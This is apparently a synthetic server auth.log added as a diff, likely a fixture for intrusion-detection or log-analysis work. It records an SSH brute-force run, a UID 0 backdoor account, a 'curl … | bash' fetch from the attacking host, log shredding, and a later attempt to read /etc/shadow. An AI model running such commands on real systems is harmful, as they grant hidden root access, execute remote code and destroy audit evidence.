+Oct 12 20:00:44 web01 CRON[28936]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 20:00:45 web01 CRON[24139]: pam_unix(cron:session): session closed for user root
+Oct 12 20:10:50 web01 CRON[42303]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 20:10:51 web01 CRON[7714]: pam_unix(cron:session): session closed for user root
+Oct 12 20:20:50 web01 CRON[12134]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 20:20:51 web01 CRON[6319]: pam_unix(cron:session): session closed for user root
+Oct 12 20:30:45 web01 CRON[2005]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 20:30:46 web01 CRON[60480]: pam_unix(cron:session): session closed for user root
+Oct 12 20:40:19 web01 CRON[42301]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 20:40:20 web01 CRON[44229]: pam_unix(cron:session): session closed for user root
+Oct 12 20:50:54 web01 CRON[13697]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 20:50:55 web01 CRON[11284]: pam_unix(cron:session): session closed for user root
+Oct 12 21:00:43 web01 CRON[13900]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 21:00:44 web01 CRON[7982]: pam_unix(cron:session): session closed for user root
+Oct 12 21:10:05 web01 CRON[11450]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 21:10:06 web01 CRON[37047]: pam_unix(cron:session): session closed for user root
+Oct 12 21:20:41 web01 CRON[60770]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 21:20:42 web01 CRON[27521]: pam_unix(cron:session): session closed for user root
+Oct 12 21:30:36 web01 CRON[40036]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 21:30:37 web01 CRON[17091]: pam_unix(cron:session): session closed for user root
+Oct 12 21:40:59 web01 CRON[60922]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 21:41:00 web01 CRON[59633]: pam_unix(cron:session): session closed for user root
+Oct 12 21:50:03 web01 CRON[29221]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 21:50:04 web01 CRON[15904]: pam_unix(cron:session): session closed for user root
+Oct 12 22:00:43 web01 CRON[52648]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 22:00:44 web01 CRON[28243]: pam_unix(cron:session): session closed for user root
+Oct 12 22:10:21 web01 CRON[56803]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 22:10:22 web01 CRON[37149]: pam_unix(cron:session): session closed for user root
+Oct 12 22:20:29 web01 CRON[32004]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 22:20:30 web01 CRON[49795]: pam_unix(cron:session): session closed for user root
+Oct 12 22:30:12 web01 CRON[5841]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 22:30:13 web01 CRON[5834]: pam_unix(cron:session): session closed for user root
+Oct 12 22:40:04 web01 CRON[56590]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 22:40:05 web01 CRON[43564]: pam_unix(cron:session): session closed for user root
+Oct 12 22:50:42 web01 CRON[9923]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 22:50:43 web01 CRON[24652]: pam_unix(cron:session): session closed for user root
+Oct 12 23:00:17 web01 CRON[39030]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 23:00:18 web01 CRON[25814]: pam_unix(cron:session): session closed for user root
+Oct 12 23:10:01 web01 CRON[1010]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 23:10:02 web01 CRON[62414]: pam_unix(cron:session): session closed for user root
+Oct 12 23:20:51 web01 CRON[45505]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 23:20:52 web01 CRON[60822]: pam_unix(cron:session): session closed for user root
+Oct 12 23:30:15 web01 CRON[4879]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 23:30:16 web01 CRON[36381]: pam_unix(cron:session): session closed for user root
+Oct 12 23:40:35 web01 CRON[62167]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 23:40:36 web01 CRON[8540]: pam_unix(cron:session): session closed for user root
+Oct 12 23:50:54 web01 CRON[43731]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 23:50:55 web01 CRON[64796]: pam_unix(cron:session): session closed for user root
+Oct 13 00:00:24 web01 CRON[48874]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 00:00:25 web01 CRON[63462]: pam_unix(cron:session): session closed for user root
+Oct 13 00:10:25 web01 CRON[6938]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 00:10:26 web01 CRON[14080]: pam_unix(cron:session): session closed for user root
+Oct 13 00:20:51 web01 CRON[13127]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 00:20:52 web01 CRON[47969]: pam_unix(cron:session): session closed for user root
+Oct 13 00:30:53 web01 CRON[24616]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 00:30:54 web01 CRON[47750]: pam_unix(cron:session): session closed for user root
+Oct 13 00:40:13 web01 CRON[62810]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 00:40:14 web01 CRON[46968]: pam_unix(cron:session): session closed for user root
+Oct 13 00:50:33 web01 CRON[44379]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 00:50:34 web01 CRON[60627]: pam_unix(cron:session): session closed for user root
+Oct 13 01:00:03 web01 CRON[48451]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 01:00:04 web01 CRON[61284]: pam_unix(cron:session): session closed for user root
+Oct 13 01:10:15 web01 CRON[7581]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 01:10:16 web01 CRON[20401]: pam_unix(cron:session): session closed for user root
+Oct 13 01:20:35 web01 CRON[21770]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 01:20:36 web01 CRON[19766]: pam_unix(cron:session): session closed for user root
+Oct 13 01:30:20 web01 CRON[58379]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 01:30:21 web01 CRON[20061]: pam_unix(cron:session): session closed for user root
+Oct 13 01:40:58 web01 CRON[3837]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 01:40:59 web01 CRON[17684]: pam_unix(cron:session): session closed for user root
+Oct 13 01:50:26 web01 CRON[22010]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 01:50:27 web01 CRON[23302]: pam_unix(cron:session): session closed for user root
+Oct 13 02:00:44 web01 CRON[6825]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 02:00:45 web01 CRON[43090]: pam_unix(cron:session): session closed for user root
+Oct 13 02:10:57 web01 CRON[36456]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 02:10:58 web01 CRON[50712]: pam_unix(cron:session): session closed for user root
+Oct 13 02:13:03 web01 sshd[56077]: Failed password for root from 203.0.113.45 port 41321 ssh2
+Oct 13 02:13:05 web01 sshd[41098]: Failed password for root from 203.0.113.45 port 60880 ssh2
+Oct 13 02:13:06 web01 sshd[4983]: Failed password for root from 203.0.113.45 port 45053 ssh2
+Oct 13 02:13:07 web01 sshd[50263]: Failed password for invalid user admin from 203.0.113.45 port 51359 ssh2
+Oct 13 02:13:11 web01 sshd[41954]: Failed password for root from 203.0.113.45 port 33830 ssh2
+Oct 13 02:13:15 web01 sshd[26856]: Failed password for deploy from 203.0.113.45 port 53922 ssh2
+Oct 13 02:13:18 web01 sshd[61660]: Failed password for deploy from 203.0.113.45 port 32774 ssh2
+Oct 13 02:13:22 web01 sshd[48019]: Failed password for deploy from 203.0.113.45 port 60688 ssh2
+Oct 13 02:13:26 web01 sshd[54385]: Failed password for root from 203.0.113.45 port 36352 ssh2
+Oct 13 02:13:30 web01 sshd[9450]: Failed password for root from 203.0.113.45 port 59575 ssh2
+Oct 13 02:13:34 web01 sshd[39664]: Failed password for root from 203.0.113.45 port 34735 ssh2
+Oct 13 02:13:35 web01 sshd[50404]: Failed password for root from 203.0.113.45 port 57508 ssh2
+Oct 13 02:13:37 web01 sshd[39715]: Failed password for root from 203.0.113.45 port 50999 ssh2
+Oct 13 02:13:41 web01 sshd[18351]: Failed password for root from 203.0.113.45 port 52163 ssh2
+Oct 13 02:13:43 web01 sshd[11024]: Failed password for invalid user admin from 203.0.113.45 port 42324 ssh2
+Oct 13 02:13:44 web01 sshd[15956]: Failed password for deploy from 203.0.113.45 port 49458 ssh2
+Oct 13 02:13:46 web01 sshd[1931]: Failed password for root from 203.0.113.45 port 46298 ssh2
+Oct 13 02:13:50 web01 sshd[36842]: Failed password for invalid user admin from 203.0.113.45 port 41226 ssh2
+Oct 13 02:13:52 web01 sshd[27440]: Failed password for root from 203.0.113.45 port 52998 ssh2
+Oct 13 02:13:56 web01 sshd[39546]: Failed password for root from 203.0.113.45 port 41834 ssh2
+Oct 13 02:14:00 web01 sshd[1010]: Failed password for deploy from 203.0.113.45 port 41610 ssh2
+Oct 13 02:14:01 web01 sshd[29745]: Failed password for root from 203.0.113.45 port 52461 ssh2
+Oct 13 02:14:02 web01 sshd[59421]: Failed password for root from 203.0.113.45 port 54735 ssh2
+Oct 13 02:14:04 web01 sshd[37107]: Failed password for invalid user admin from 203.0.113.45 port 56875 ssh2
+Oct 13 02:14:05 web01 sshd[24362]: Failed password for root from 203.0.113.45 port 37757 ssh2
+Oct 13 02:14:06 web01 sshd[51266]: Failed password for invalid user admin from 203.0.113.45 port 38831 ssh2
+Oct 13 02:14:09 web01 sshd[28999]: Failed password for deploy from 203.0.113.45 port 48342 ssh2
+Oct 13 02:14:11 web01 sshd[38341]: Failed password for invalid user admin from 203.0.113.45 port 34605 ssh2
+Oct 13 02:14:14 web01 sshd[25267]: Failed password for root from 203.0.113.45 port 49172 ssh2
+Oct 13 02:14:17 web01 sshd[3646]: Failed password for deploy from 203.0.113.45 port 57032 ssh2
+Oct 13 02:14:20 web01 sshd[33381]: Failed password for root from 203.0.113.45 port 37046 ssh2
+Oct 13 02:14:21 web01 sshd[54723]: Failed password for root from 203.0.113.45 port 44654 ssh2
+Oct 13 02:14:22 web01 sshd[56492]: Failed password for deploy from 203.0.113.45 port 35316 ssh2
+Oct 13 02:14:24 web01 sshd[18623]: Failed password for deploy from 203.0.113.45 port 35459 ssh2
+Oct 13 02:14:28 web01 sshd[19965]: Failed password for root from 203.0.113.45 port 41767 ssh2
+Oct 13 02:14:30 web01 sshd[37096]: Failed password for invalid user admin from 203.0.113.45 port 51354 ssh2
+Oct 13 02:14:33 web01 sshd[24150]: Failed password for deploy from 203.0.113.45 port 58771 ssh2
+Oct 13 02:14:37 web01 sshd[7315]: Failed password for root from 203.0.113.45 port 59652 ssh2
+Oct 13 02:14:40 web01 sshd[32571]: Failed password for deploy from 203.0.113.45 port 48738 ssh2
+Oct 13 02:14:43 web01 sshd[47313]: Failed password for invalid user admin from 203.0.113.45 port 60777 ssh2
+Oct 13 02:14:45 web01 sshd[50402]: Failed password for root from 203.0.113.45 port 45264 ssh2
+Oct 13 02:14:45 web01 sshd[47413]: message repeated 6 times: [ Failed password for root from 203.0.113.45 port 53255 ssh2]
+Oct 13 02:14:47 web01 sshd[23585]: Failed password for invalid user admin from 203.0.113.45 port 35082 ssh2
+Oct 13 02:14:51 web01 sshd[8342]: Failed password for root from 203.0.113.45 port 50947 ssh2
+Oct 13 02:14:55 web01 sshd[61635]: Failed password for deploy from 203.0.113.45 port 54723 ssh2
+Oct 13 02:14:56 web01 sshd[58381]: Failed password for invalid user admin from 203.0.113.45 port 51941 ssh2
+Oct 13 02:14:59 web01 sshd[44713]: Failed password for deploy from 203.0.113.45 port 40793 ssh2
+Oct 13 02:15:01 web01 sshd[19352]: Failed password for invalid user admin from 203.0.113.45 port 46979 ssh2
+Oct 13 02:15:05 web01 sshd[43987]: Failed password for root from 203.0.113.45 port 46967 ssh2
+Oct 13 02:15:07 web01 sshd[14878]: Failed password for root from 203.0.113.45 port 56657 ssh2
+Oct 13 02:15:11 web01 sshd[43109]: Failed password for root from 203.0.113.45 port 39376 ssh2
+Oct 13 02:15:12 web01 sshd[7093]: Failed password for deploy from 203.0.113.45 port 55043 ssh2
+Oct 13 02:15:16 web01 sshd[43141]: Failed password for invalid user admin from 203.0.113.45 port 42787 ssh2
+Oct 13 02:15:20 web01 sshd[53876]: Failed password for root from 203.0.113.45 port 52223 ssh2
+Oct 13 02:15:24 web01 sshd[3759]: Failed password for invalid user admin from 203.0.113.45 port 57784 ssh2
+Oct 13 02:15:27 web01 sshd[40806]: Failed password for root from 203.0.113.45 port 35198 ssh2
+Oct 13 02:15:28 web01 sshd[30871]: Failed password for root from 203.0.113.45 port 45414 ssh2
+Oct 13 02:15:32 web01 sshd[36479]: Failed password for deploy from 203.0.113.45 port 54830 ssh2
+Oct 13 02:15:35 web01 sshd[22796]: Failed password for deploy from 203.0.113.45 port 56864 ssh2
+Oct 13 02:15:39 web01 sshd[1771]: Failed password for deploy from 203.0.113.45 port 46356 ssh2
+Oct 13 02:15:41 web01 sshd[34748]: Failed password for deploy from 203.0.113.45 port 52204 ssh2
+Oct 13 02:15:42 web01 sshd[29239]: Failed password for invalid user admin from 203.0.113.45 port 56826 ssh2
+Oct 13 02:15:44 web01 sshd[53263]: Failed password for invalid user admin from 203.0.113.45 port 39302 ssh2
+Oct 13 02:15:47 web01 sshd[59510]: Failed password for root from 203.0.113.45 port 55163 ssh2
+Oct 13 02:15:49 web01 sshd[4681]: Failed password for root from 203.0.113.45 port 58049 ssh2
+Oct 13 02:15:53 web01 sshd[44015]: Failed password for invalid user admin from 203.0.113.45 port 40857 ssh2
+Oct 13 02:15:54 web01 sshd[64408]: Failed password for deploy from 203.0.113.45 port 60658 ssh2
+Oct 13 02:15:55 web01 sshd[61909]: Failed password for deploy from 203.0.113.45 port 41099 ssh2
+Oct 13 02:15:58 web01 sshd[6368]: Failed password for root from 203.0.113.45 port 54828 ssh2
+Oct 13 02:16:01 web01 sshd[44437]: Failed password for root from 203.0.113.45 port 34765 ssh2
+Oct 13 02:16:04 web01 sshd[49875]: Failed password for invalid user admin from 203.0.113.45 port 54046 ssh2
+Oct 13 02:16:07 web01 sshd[56997]: Failed password for deploy from 203.0.113.45 port 50469 ssh2
+Oct 13 02:16:10 web01 sshd[38345]: Failed password for root from 203.0.113.45 port 37601 ssh2
+Oct 13 02:19:10 web01 sshd[44056]: Accepted password for deploy from 203.0.113.45 port 58151 ssh2
+Oct 13 02:20:10 web01 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+Oct 13 02:20:37 web01 CRON[18616]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 02:20:38 web01 CRON[36124]: pam_unix(cron:session): session closed for user root
+Oct 13 02:21:10 web01 useradd[6591]: new group: name=sysbackup, GID=0
+Oct 13 02:21:15 web01 useradd[32365]: new user: name=sysbackup, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/1
+Oct 13 02:22:10 web01 usermod[23848]: add 'deploy' to group 'sudo'
+Oct 13 02:22:10 web01 usermod[42721]: add 'deploy' to shadow group 'sudo'
+Oct 13 02:23:10 web01 sudo: deploy : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.45/x.sh | bash
+Oct 13 02:25:10 web01 sudo: deploy : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/shred -u /var/log/auth.log.1
+Oct 13 02:30:17 web01 CRON[3263]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 02:30:18 web01 CRON[58369]: pam_unix(cron:session): session closed for user root
+Oct 13 02:40:20 web01 CRON[59036]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 02:40:21 web01 CRON[55581]: pam_unix(cron:session): session closed for user root
+Oct 13 02:50:03 web01 CRON[62272]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 02:50:04 web01 CRON[10163]: pam_unix(cron:session): session closed for user root
+Oct 13 03:00:27 web01 CRON[33565]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 03:00:28 web01 CRON[59100]: pam_unix(cron:session): session closed for user root
+Oct 13 03:10:31 web01 CRON[43166]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 03:10:32 web01 CRON[53053]: pam_unix(cron:session): session closed for user root
+Oct 13 03:20:36 web01 CRON[23518]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 03:20:37 web01 CRON[12091]: pam_unix(cron:session): session closed for user root
+Oct 13 03:30:38 web01 CRON[25617]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 03:30:39 web01 CRON[64776]: pam_unix(cron:session): session closed for user root
+Oct 13 03:40:33 web01 CRON[44163]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 03:40:34 web01 CRON[2377]: pam_unix(cron:session): session closed for user root
+Oct 13 03:50:28 web01 CRON[5827]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 03:50:29 web01 CRON[39303]: pam_unix(cron:session): session closed for user root
+Oct 13 04:00:12 web01 CRON[58518]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 04:00:13 web01 CRON[46527]: pam_unix(cron:session): session closed for user root
+Oct 13 04:10:34 web01 CRON[26140]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 04:10:35 web01 CRON[49290]: pam_unix(cron:session): session closed for user root
+Oct 13 04:20:19 web01 CRON[14612]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 04:20:20 web01 CRON[53049]: pam_unix(cron:session): session closed for user root
+Oct 13 04:30:33 web01 CRON[33081]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 04:30:34 web01 CRON[45319]: pam_unix(cron:session): session closed for user root
+Oct 13 04:40:39 web01 CRON[41557]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 04:40:40 web01 CRON[27725]: pam_unix(cron:session): session closed for user root
+Oct 13 04:50:36 web01 CRON[30681]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 04:50:37 web01 CRON[47920]: pam_unix(cron:session): session closed for user root
+Oct 13 05:00:37 web01 CRON[9369]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 05:00:38 web01 CRON[26655]: pam_unix(cron:session): session closed for user root
+Oct 13 05:10:24 web01 CRON[49899]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 05:10:25 web01 CRON[26436]: pam_unix(cron:session): session closed for user root
+Oct 13 05:20:11 web01 CRON[5996]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 05:20:12 web01 CRON[18142]: pam_unix(cron:session): session closed for user root
+Oct 13 05:30:21 web01 CRON[9471]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 05:30:22 web01 CRON[17492]: pam_unix(cron:session): session closed for user root
+Oct 13 05:40:41 web01 CRON[38209]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 05:40:42 web01 CRON[18737]: pam_unix(cron:session): session closed for user root
+Oct 13 05:50:45 web01 CRON[35320]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 05:50:46 web01 CRON[17415]: pam_unix(cron:session): session closed for user root
+Oct 13 06:00:06 web01 CRON[7580]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 06:00:07 web01 CRON[41788]: pam_unix(cron:session): session closed for user root
+Oct 13 06:10:11 web01 CRON[9569]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 06:10:12 web01 CRON[23807]: pam_unix(cron:session): session closed for user root
+Oct 13 06:20:43 web01 CRON[28059]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 06:20:44 web01 CRON[9455]: pam_unix(cron:session): session closed for user root
+Oct 13 06:30:32 web01 CRON[8960]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 06:30:33 web01 CRON[43926]: pam_unix(cron:session): session closed for user root
+Oct 13 06:40:09 web01 CRON[34048]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 06:40:10 web01 CRON[26388]: pam_unix(cron:session): session closed for user root
+Oct 13 06:50:44 web01 CRON[64635]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 06:50:45 web01 CRON[62093]: pam_unix(cron:session): session closed for user root
+Oct 13 07:00:22 web01 CRON[44837]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 07:00:23 web01 CRON[29435]: pam_unix(cron:session): session closed for user root
+Oct 13 07:10:35 web01 CRON[2147]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 07:10:36 web01 CRON[51857]: pam_unix(cron:session): session closed for user root
+Oct 13 07:20:59 web01 CRON[20853]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 07:21:00 web01 CRON[7111]: pam_unix(cron:session): session closed for user root
+Oct 13 07:30:24 web01 CRON[48596]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 07:30:25 web01 CRON[26435]: pam_unix(cron:session): session closed for user root
+Oct 13 07:40:39 web01 CRON[34651]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 07:40:40 web01 CRON[31001]: pam_unix(cron:session): session closed for user root
+Oct 13 07:50:49 web01 CRON[3001]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 07:50:50 web01 CRON[7707]: pam_unix(cron:session): session closed for user root
+Oct 13 08:00:03 web01 CRON[62266]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 08:00:04 web01 CRON[38407]: pam_unix(cron:session): session closed for user root
+Oct 13 08:10:15 web01 CRON[51719]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 08:10:16 web01 CRON[11042]: pam_unix(cron:session): session closed for user root
+Oct 13 08:20:14 web01 CRON[46896]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 08:20:15 web01 CRON[5443]: pam_unix(cron:session): session closed for user root
+Oct 13 08:30:45 web01 CRON[2787]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 08:30:46 web01 CRON[49186]: pam_unix(cron:session): session closed for user root
+Oct 13 08:40:03 web01 CRON[60475]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 08:40:04 web01 CRON[41720]: pam_unix(cron:session): session closed for user root
+Oct 13 08:50:02 web01 CRON[39292]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 08:50:03 web01 CRON[63567]: pam_unix(cron:session): session closed for user root
+Oct 13 09:00:33 web01 CRON[41328]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 09:00:34 web01 CRON[2744]: pam_unix(cron:session): session closed for user root
+Oct 13 09:10:36 web01 CRON[46557]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 09:10:37 web01 CRON[58228]: pam_unix(cron:session): session closed for user root
+Oct 13 09:19:47 web01 sshd[28442]: Accepted publickey for bob from 10.0.0.18 port 48602 ssh2: ED25519 SHA256:x
+Oct 13 09:19:48 web01 systemd-logind[53536]: New session 5201 of user bob.
+Oct 13 09:20:20 web01 CRON[51780]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 09:20:21 web01 CRON[11108]: pam_unix(cron:session): session closed for user root
+Oct 13 09:21:47 web01 sudo: bob : TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Oct 13 09:30:39 web01 CRON[54882]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 09:30:40 web01 CRON[23503]: pam_unix(cron:session): session closed for user root
+Oct 13 09:40:15 web01 CRON[20493]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 09:40:16 web01 CRON[39938]: pam_unix(cron:session): session closed for user root
+Oct 13 09:49:47 web01 sshd[35002]: Received disconnect from 10.0.0.18 port 46752:11: disconnected by user
+Oct 13 09:50:45 web01 CRON[20888]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 09:50:46 web01 CRON[62453]: pam_unix(cron:session): session closed for user root
+Oct 13 10:00:21 web01 CRON[61122]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 10:00:22 web01 CRON[21177]: pam_unix(cron:session): session closed for user root
+Oct 13 10:04:05 web01 sshd[17889]: Accepted publickey for carol from 10.0.0.27 port 49977 ssh2: ED25519 SHA256:x
+Oct 13 10:04:06 web01 systemd-logind[21709]: New session 2988 of user carol.
+Oct 13 10:10:39 web01 CRON[26887]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 10:10:40 web01 CRON[54029]: pam_unix(cron:session): session closed for user root
+Oct 13 10:20:48 web01 CRON[23183]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 10:20:49 web01 CRON[47816]: pam_unix(cron:session): session closed for user root
+Oct 13 10:30:11 web01 CRON[3077]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 10:30:12 web01 CRON[35896]: pam_unix(cron:session): session closed for user root
+Oct 13 10:31:00 web01 sudo: carol : user NOT in sudoers ; TTY=pts/2 ; PWD=/home/carol ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Oct 13 10:33:00 web01 sudo: carol : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/su -
+Oct 13 10:33:47 web01 sshd[8898]: Accepted publickey for carol from 10.0.0.20 port 58011 ssh2: ED25519 SHA256:x
+Oct 13 10:33:48 web01 systemd-logind[47960]: New session 5365 of user carol.
+Oct 13 10:34:05 web01 sshd[56795]: Received disconnect from 10.0.0.27 port 49013:11: disconnected by user
+Oct 13 10:35:47 web01 sudo: carol : TTY=pts/1 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 13 10:40:39 web01 CRON[57810]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 10:40:40 web01 CRON[26921]: pam_unix(cron:session): session closed for user root
+Oct 13 10:42:02 web01 sshd[58482]: Accepted publickey for carol from 10.0.0.25 port 58679 ssh2: ED25519 SHA256:x
+Oct 13 10:42:03 web01 systemd-logind[57440]: New session 5473 of user carol.
+Oct 13 10:44:02 web01 sudo: carol : TTY=pts/2 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 13 10:50:58 web01 CRON[7567]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 10:50:59 web01 CRON[29648]: pam_unix(cron:session): session closed for user root
+Oct 13 11:00:27 web01 CRON[27168]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 11:00:28 web01 CRON[16027]: pam_unix(cron:session): session closed for user root
+Oct 13 11:03:47 web01 sshd[14716]: Received disconnect from 10.0.0.20 port 49417:11: disconnected by user
+Oct 13 11:10:28 web01 CRON[51061]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 11:10:29 web01 CRON[42483]: pam_unix(cron:session): session closed for user root
+Oct 13 11:12:02 web01 sshd[56009]: Received disconnect from 10.0.0.25 port 45761:11: disconnected by user
+Oct 13 11:20:04 web01 CRON[16308]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 11:20:05 web01 CRON[1281]: pam_unix(cron:session): session closed for user root
+Oct 13 11:30:45 web01 CRON[48086]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 11:30:46 web01 CRON[34925]: pam_unix(cron:session): session closed for user root
+Oct 13 11:36:40 web01 sshd[42928]: Accepted publickey for bob from 10.0.0.35 port 34498 ssh2: ED25519 SHA256:x
+Oct 13 11:36:41 web01 systemd-logind[41050]: New session 9578 of user bob.
+Oct 13 11:38:40 web01 sudo: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Oct 13 11:40:11 web01 CRON[27397]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 11:40:12 web01 CRON[18475]: pam_unix(cron:session): session closed for user root
+Oct 13 11:50:48 web01 CRON[39945]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 11:50:49 web01 CRON[39555]: pam_unix(cron:session): session closed for user root
+Oct 13 12:00:21 web01 CRON[17774]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 13 12:00:22 web01 CRON[30569]: pam_unix(cron:session): session closed for user root
+Oct 13 12:02:33 web01 sshd[22127]: Accepted publickey for alice from 10.0.0.21 port 60884 ssh2: ED25519 SHA256:x
+Oct 13 12:02:34 web01 systemd-logind[40840]: New session 8767 of user alice.
